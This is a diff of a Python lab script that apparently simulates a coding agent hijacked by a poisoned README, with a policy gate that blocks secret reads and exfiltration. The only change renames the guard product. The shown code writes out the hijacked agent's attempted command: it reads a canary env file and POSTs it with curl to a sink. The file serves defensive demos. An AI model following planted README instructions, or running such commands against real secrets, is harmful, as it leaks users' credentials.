@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """Simulate a hijacked coding agent following the poisoned README.
 
-All sensitive actions go through SwarmGuard's policy gate (policy.py).
+All sensitive actions go through MuseSwarm's policy gate (policy.py).
 With SWARMGUARD_ENFORCE=1 (default): secret read + exfil are DENIED — your machine stays safe.
 With SWARMGUARD_ENFORCE=0: canary + localhost sink allowed for lab detection demos only.
 """
@@ -101,7 +101,7 @@ def main() -> int:
             f"Agent then attempted: cat {CANARY_ENV.name} && "
             f"curl -s -X POST {SINK} --data-binary @{CANARY_ENV.name}. "
             + (
-                f"SwarmGuard PEP BLOCKED the action ({blocked[0]['rule']}). "
+                f"MuseSwarm PEP BLOCKED the action ({blocked[0]['rule']}). "
                 if blocked
                 else f"Outbound POST completed with HTTP {status}. "
             )
